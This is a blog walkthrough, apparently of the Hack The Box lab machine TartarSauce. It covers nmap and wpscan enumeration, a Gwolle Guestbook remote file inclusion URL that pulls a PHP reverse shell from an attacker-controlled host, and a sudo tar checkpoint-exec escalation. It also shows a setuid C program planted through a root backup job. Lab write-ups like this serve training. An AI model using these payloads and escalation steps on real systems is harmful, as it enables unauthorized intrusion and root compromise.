@@ -1,0 +1,378 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
+
+    
+      <link rel="icon" href="/favicon.png" />
+    
+
+    <title>
+        
+          Hack The Box - TartaSauce - DiegoExploit
+        
+    </title>
+    <style>
+  #carbonads {
+    border: 1px solid black;
+    border-radius: 7px;
+    border-spacing: 7px;
+    display: block;
+    overflow: hidden;
+    padding: 1em;
+    line-height: 1.5;
+  }
+  #carbonads span {
+    position: relative;
+    display: block;
+    overflow: hidden;
+  }
+  .carbon-img {
+    float: left;
+    margin-right: 1em;
+  }
+  .carbon-img img {
+    display: block;
+  }
+  .carbon-text {
+    display: block;
+    float: left;
+    max-width: calc(100% - 130px - 1em);
+    text-align: left;
+  }
+  .carbon-poweredby {
+    position: absolute;
+    left: 142px;
+    bottom: 0;
+    display: block;
+    font-size: .8em;
+    line-height: 1;
+    letter-spacing: 1px;
+    }
+    </style>
+    <!-- Spectre.css framework -->
+    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre.min.css">
+    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre-exp.min.css">
+    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre-icons.min.css">
+
+    <!-- theme css & js -->
+    
+<link rel="stylesheet" href="/css/book.css">
+
+    
+<script src="/js/book.js"></script>
+
+
+    <!-- tocbot -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css">
+    
+    <!-- katex -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+
+    
+<!-- Google Tag Manager -->
+<script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
+new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
+j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
+'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
+})(window,document,'script','dataLayer','GTM-P385GSF');</script>
+<!-- End Google Tag Manager -->
+<!-- Google Tag Manager (noscript) -->
+<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-P385GSF"
+height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
+<!-- End Google Tag Manager (noscript) -->
+
+    
+<script src="https://cdnjs.cloudflare.com/ajax/libs/zooming/2.1.1/zooming.min.js"></script>
+<script>
+document.addEventListener('DOMContentLoaded', function () {
+    const zooming = new Zooming()
+    zooming.listen('.book-content img')
+})
+</script>
+
+    <style>
+      #htbbadge{
+        float: left;
+      }
+    </style>
+<meta name="generator" content="Hexo 4.2.0"><link rel="alternate" href="/feed.xml" title="DiegoExploit" type="application/rss+xml">
+</head>
+
+<body>
+
+<div class="book-container">
+  <div class="book-sidebar">
+    <div class="book-brand">
+  <a href="/">
+    <img src="/favicon.png">
+    <span>DiegoExploit</span>
+  </a>
+</div>
+    <div class="book-menu">
+  <ul>
+<li><a href="/">Home</a></li>
+</ul>
+<h1 id="Categories Windows"><a href="#Categories Windows" class="headerlink" title="Categories Windows"></a>Categories Windows</h1><h2 id="Hack-The-Box-"><a href="#Hack-The-Box-" class="headerlink" title="Hack The Box"></a>Hack The Box </h2><ul>
+<li><a href="/hack-the-box/legacy/">1. Hack The Box - Legacy</a></li>
+<li><a href="/hack-the-box/devel/">2. Hack The Box - Devel</a></li>
+<li><a href="/hack-the-box/optimum/">3. Hack The Box - Optimum</a></li>
+<li><a href="/hack-the-box/bastard/">4. Hack The Box - Bastard</a></li>
+<li><a href="/hack-the-box/artic/">5. Hack The Box - Artic</a></li>
+<li><a href="/hack-the-box/grandpa/">6. Hack The Box - Grandpa</a></li>
+<li><a href="/hack-the-box/granny/">7. Hack The Box - Granny</a></li>
+<li><a href="/hack-the-box/blue/">8. Hack The Box - Blue</a></li>
+<li><a href="/hack-the-box/silo/">9. Hack The Box - Silo</a></li>
+<li><a href="/hack-the-box/bounty/">10. Hack The Box - Bounty</a></li>
+<li><a href="/hack-the-box/jerry/">11. Hack The Box - Jerry</a></li>
+<li><a href="/hack-the-box/conceal/">12. Hack The Box - Conceal</a></li>
+<li><a href="/hack-the-box/chatterbox/">13. Hack The Box - Chatterbox</a></li>
+<li><a href="/hack-the-box/forest/">14. Hack The Box - Forest</a></li>
+<li><a href="/hack-the-box/bankrobber/">15. Hack The Box - BkRobber</a></li>
+<li><a href="/hack-the-box/secnotes/">16. Hack The Box - Secnotes</a></li>
+<li><a href="/hack-the-box/bastion/">17. Hack The Box - Bastion</a></li>
+
+</ul>
+<h1 id="Categories Linux"><a href="#Categories Linux" class="headerlink" title="Categories Linux"></a>Categories Linux</h1><h2 id="Hack-The-Box-"><a href="#Hack-The-Box-" class="headerlink" title="Hack The Box"></a>Hack The Box </h2><ul>
+<li><a href="/hack-the-box/lame/">1. Hack The Box - Lame</a></li>
+<li><a href="/hack-the-box/popcorn/">2. Hack The Box - Popcorn</a></li>
+<li><a href="/hack-the-box/beep/">3. Hack The Box - Beep</a></li>
+<li><a href="/hack-the-box/tenten/">4. Hack The Box - Tenten</a></li>
+<li><a href="/hack-the-box/cronos/">5. Hack The Box - Cronos</a></li>
+<li><a href="/hack-the-box/brainfuck/">6. Hack The Box - brainfuck</a></li>
+<li><a href="/hack-the-box/shocker/">6. Hack The Box - Shocker</a></li>
+<li><a href="/hack-the-box/bashed/">7. Hack The Box - Bashed</a></li>
+<li><a href="/hack-the-box/nibbles/">8. Hack The Box - Nibbles</a></li>
+<li><a href="/hack-the-box/nineveh/">9. Hack The Box - Nineveh</a></li>
+<li><a href="/hack-the-box/sense/">10. Hack The Box - Sense</a></li>
+<li><a href="/hack-the-box/solidstate/">11. Hack The Box - SolidState</a></li>
+<li><a href="/hack-the-box/kotarak/">12. Hack The Box - Kotarak</a></li>
+<li><a href="/hack-the-box/node/">13. Hack The Box - Node</a></li>
+<li><a href="/hack-the-box/valentine/">14. Hack The Box - Valentine</a></li>
+<li><a href="/hack-the-box/poison/">15. Hack The Box - Poison</a></li>
+<li><a href="/hack-the-box/sunday/">16. Hack The Box - Sunday</a></li>
+<li><a href="/hack-the-box/tartasauce/">17. Hack The Box - Tartasauce</a></li>
+<li><a href="/hack-the-box/friendzone/">18. Hack The Box - Friendzone</a></li>
+<li><a href="/hack-the-box/swagshop/">19. HTB- SwagShop</a></li>
+<li><a href="/hack-the-box/jarvis/">20. Hack The Box Jarvis</a></li>
+</ul>
+
+
+
+
+</div>
+
+
+<script src="/js/book-menu.js"></script>
+
+  </div>
+
+  <div class="off-canvas-content">
+    <div class="columns">
+      <div class="column col-10 col-lg-12">
+        <div class="book-navbar">
+          <!-- For Responsive Layout -->
+
+<header class="navbar">
+  <section class="navbar-section">
+    <a onclick="open_sidebar()">
+      <i class="icon icon-menu"></i>
+    </a>
+  </section>
+</header>
+
+        </div>
+        <div class="book-content">
+          <div class="book-post">
+  <br>
+  <h1 id="Hack-The-Box-TartaSauce"><a href="#Hack-The-Box-TartaSauce" class="headerlink" title="Hack The Box - TartaSauce"></a>Hack The Box - TartaSauce</h1><h2 id="Quick-Summary"><a href="#Quick-Summary" class="headerlink" title="Quick Summary"></a>Quick Summary</h2><p>TartarSauce is a fairly challenging box that highlights the importance of a broad remote enumeration instead of focusing on obvious but potentially less fruitful attack vectors. It features a quite realistic privilege escalation requiring abuses of the tar command. Attention to detail when reviewing tool output is beneficial when attempting this machine. Its IP address is <code>10.10.10.88</code> Let’s go to hack!!!<br><img src="/images/hackthebox/exploit/tartasauce/0.png" alt=""></p>
+<h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h2>
+<p>As always we will start with <code>nmap</code> to scan for open ports and services, previously launched a nmap basic scan to all ports, the output was the 80,443,445,3606 open ports:
+<pre><figure class="highlight plain">  |-------(root@kali)-------|(~/HackTheBox/tartasauce)
+ |                                                                                                                                                                                                                                          
+ |-->{SFire129}#nmap -sC -sV -p80   10.10.10.88                                                                                                                                                                                
+ Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-06 14:08 EDT
+ Nmap scan report for 10.10.10.88
+ Host is up (0.17s latency).
+ 
+ PORT   STATE SERVICE VERSION
+ 80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+ | http-robots.txt: 5 disallowed entries 
+ | /webservices/tar/tar/source/ 
+ | /webservices/monstra-3.0.4/ /webservices/easy-file-uploader/ 
+ |_/webservices/developmental/ /webservices/phpmyadmin/
+ |_http-server-header: Apache/2.4.18 (Ubuntu)
+ |_http-title: Landing Page
+ 
+ Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+ Nmap done: 1 IP address (1 host up) scanned in 12.99 seconds   </figure></pre>
+  <h2 id="Enumeration"><a href="#Enumeration" class="Enumeration" title="Enumeration"></a>Enumeration</h2>
+ <p>Browse on the robot.txt file, show files from application.
+ <img src="/images/hackthebox/exploit/tartasauce/1.png" alt=""></p>
+ <p>The web application run on Monstra CMS.
+ <img src="/images/hackthebox/exploit/tartasauce/2.png" alt=""></p>
+ <p>Browse on wp section.
+ <img src="/images/hackthebox/exploit/tartasauce/3.png" alt=""></p>
+ <p>Run wpscan with agressive scan plugins <code>wpscan --url http://10.10.10.88/webservices/wp/ -e ap --api-token  hz6s59smi5jEGW08CQsBrOGFWP3lTmc --plugins-detection aggressive</code>. The output show a plugin vulnerable.
+ <img src="/images/hackthebox/exploit/tartasauce/4.png" alt=""></p>
+ <p>Search the exploit.
+ <pre><figure class="highlight plain"> |-------(root@kali)-------|(~/HackTheBox/tartasauce)
+ |
+ |-->{SFire129}#searchsploit gwolle
+ --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+  Exploit Title                                                                                                                                                                                           |  Path
+ --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+ WordPress Plugin Gwolle Guestbook 1.5.3 - Remote File Inclusion                                                                                                                                          | php/webapps/38861.txt
+ --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+ Shellcodes: No Results</figure></pre>
+   <h2 id="Exploit"><a href="#Exploit" class="Exploit" title="Exploit"></a>Exploit</h2>
+ <p>The output about exploit show url payload.<code>http://[host]/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://[hackers_website]</code>. Run the nc listener on Kali Linux and browse on URL vulnerable.
+ <img src="/images/hackthebox/exploit/tartasauce/5.png" alt=""></p>
+ <p>Copy the <code>php-reverse-shell.php</code> and rename with wp-load.php in current directory.
+ <img src="/images/hackthebox/exploit/tartasauce/7.png" alt=""></p>
+<p>Run the URL in the target system
+ <img src="/images/hackthebox/exploit/tartasauce/6.png" alt=""></p>
+ <p>Run again the payload for reverse connection.
+  <img src="/images/hackthebox/exploit/tartasauce/8.png" alt=""></p>
+ <p>We have a reverse connection, fix it for interactive shell.
+  <pre><figure class="highlight plain"> $ python -c 'import pty;pty.spawn("/bin/bash");'
+ www-data@TartarSauce:/$ ^Z
+ [1]+  Stopped                 nc -lnvp 9001
+ |-------(root@kali)-------|(~/HackTheBox/tartasauce/www)
+ |                                                                                                                   
+ |-->{SFire129}#stty raw -echo                                                                                       
+ |-------(root@kali)-------|(~/HackTheBox/tartasauce/www)
+ |                                                                                                                   
+ |-->{SFire129}#nc -lnvp 9001                                                                                        
+ 
+ www-data@TartarSauce:/$
+ www-data@TartarSauce:/$ stty rows 27 columns 112
+ www-data@TartarSauce:/$ export TERM=xterm-color </figure></pre>
+ <p>Enumerate the system, found the privileges root with command <code>sudo -l</code>.
+   <pre><figure class="highlight plain"> [+] We can sudo without supplying a password!
+ Matching Defaults entries for www-data on TartarSauce:
+     env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+ 
+ User www-data may run the following commands on TartarSauce:
+     (onuma) NOPASSWD: /bin/tar
+ 
+ 
+ [+] Possible sudo pwnage!
+ /bin/tar </figure></pre>
+ <p>Search in GTFOBins web page <code>https://gtfobins.github.io/</code>, there is a code for run priviles root, in this case <code>sudo -u onuma tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash</code>, the run the LinEnum.sh script. show a process for backups.
+ <img src="/images/hackthebox/exploit/tartasauce/9.png" alt=""></p>
+ <p>Locate the backup file
+ <img src="/images/hackthebox/exploit/tartasauce/10.png" alt=""></p>
+  <h2 id="Get_privileges"><a href="#Get_privileges" class="Get_privileges" title="Get_privileges"></a>Get_privileges</h2>
+ <p>The backup task run as root user, we need to change some parameter to get privileges. In this case create a file with the next code inside:
+ <pre><figure class="highlight plain"> #include <stdlib.h>
+#include <unistd.h>
+
+int main ( int argc, char *argv[] )
+{
+        setreuid(0,0);
+        execve("bin/bas", NULL, NULL);
+} </figure></pre>
+ <p>Compile the code with <code>gcc -m32</code> option for 32 bits system, then send to box target.
+ <img src="/images/hackthebox/exploit/tartasauce/11.png" alt=""></p>
+ <p>Create the path <code>var/www/html</code> and put the code inside.
+ <img src="/images/hackthebox/exploit/tartasauce/12.png" alt=""></p>
+  <p>Add the path complete to .tar.gz file 
+ <img src="/images/hackthebox/exploit/tartasauce/13.png" alt=""></p>
+<p>When the task run, will create a folder with name checker with the code for run as root user.
+ <img src="/images/hackthebox/exploit/bankrobber/14.png" alt=""></p>
+ <h2 id="Capture-The-Flag"><a href="#Capture-The-Flag" class="Capture-The-Flag" title="Capture-The-Flag"></a>Capture The Flag</h2>
+ <pre><figure class="highlight plain"> bash-4.3# id
+uid=0(root) gid=1000(onuma) groups=1000(onuma),24(cdrom),30(dip),46(plugdev)
+bash-4.3# cd /home/onuma/   
+bash-4.3# ls
+shadow_bkp  user.txt
+bash-4.3# cat user.txt 
+***Here you coul find the user flag***
+bash-4.3# cat /root/root.txt 
+***Here you coul find the root flag***
+bash-4.3# </figure></pre>
+ 
+<p> And we owned root !</p>
+</div>
+
+
+  <div class="book-comments">
+    
+
+
+
+
+  </div>
+
+
+
+<script src="/js/book-post.js"></script>
+
+        </div>
+      </div>
+      <div class="column col-2 hide-lg">
+        <div class="book-post-info">
+  
+    <div class="book-post-meta">
+
+  <div class="author">
+
+    <!-- Author image -->
+    <div class="author-img">
+      
+        <figure class="avatar avatar-lg">
+          <img src="/avatar.png" alt="...">
+        </figure>
+      
+    </div>
+
+    <!-- Author title -->
+    <div class="author-title">
+      <div>DiegoExploit</div>
+      <div>2020-07-07</div>
+    </div>
+  </div>
+
+  
+    <div class="divider"></div>
+
+    <div class="link">
+      <a class="category-link" href="/categories/hack-the-box/">hack-the-box</a>
+
+      <a class="tag-link" href="/tags/linux/" rel="tag">#Linux</a> <a class="tag-link" href="/tags/sqli/" rel="tag">#GITFObins</a> <a class="tag-link" href="/tags/ssh/" rel="tag">#</a>
+    </div>
+    
+  
+
+  <div class="divider"></div>
+</div>
+  
+
+  <div class="book-tocbot">
+</div>
+<div class="book-tocbot-menu">
+  <a class="book-toc-expand" onclick="expand_toc()">Expand all</a>
+  <a onclick="go_top()">Back to top</a>
+  <a onclick="go_bottom()">Go to bottom</a>
+</div>
+
+
+<script src="/js/book-toc.js"></script>
+
+</div>
+      </div>
+    </div>
+  </div>
+  
+  <a class="off-canvas-overlay" onclick="hide_canvas()"></a>
+</div>
+
+</body>
+</html>
+
+
+<script src="/js/book.js"></script>
